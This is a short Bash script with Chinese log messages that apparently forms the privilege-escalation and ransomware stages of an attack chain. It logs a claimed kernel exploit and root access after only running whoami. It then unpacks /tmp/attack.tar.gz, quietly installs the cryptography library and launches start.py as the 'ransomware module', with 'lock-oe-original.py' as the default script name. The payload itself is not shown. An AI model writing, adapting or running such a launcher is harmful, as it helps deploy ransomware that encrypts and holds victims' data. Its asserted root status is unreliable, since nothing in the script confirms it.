#!/bin/bash

# ==================== 日志函数 ====================
log() {
    local level="$1"; shift
    printf "[%s] [%s] %s\n" "$(date '+%Y-%m-%d %H:%M:%S')" "$level" "$*" >&2
}
log_info() { log "INFO" "$@"; }
log_warn() { log "WARN" "$@"; }
log_error() { log "ERROR" "$@"; }
log_success() { log " OK " "$@"; }

log_info "[Step 3] 提升权限"
log_info "[+] 内核漏洞攻击成功。确认当前用户身份..."
log_info "[*] 执行语句: whoami"
log_info "[+] 当前用户: $(whoami)"
log_success "[+] 权限提升阶段完成，当前已为 root 用户权限。"


log_info "[Step 4] 执行勒索"

log_info "[*] 安装勒索功能"
script_name="${1:-lock-oe-original.py}"  # default to original script if none provided
cd /tmp && tar -xzvf /tmp/attack.tar.gz && pip3 install cryptography > /dev/null 2>&1 &&  \
    log_info "[+] 勒索模块安装完成，启动中..." &&  \
    cd attack && python3 start.py

#cd /tmp/attack && pip3 install cryptography && python3 start.py
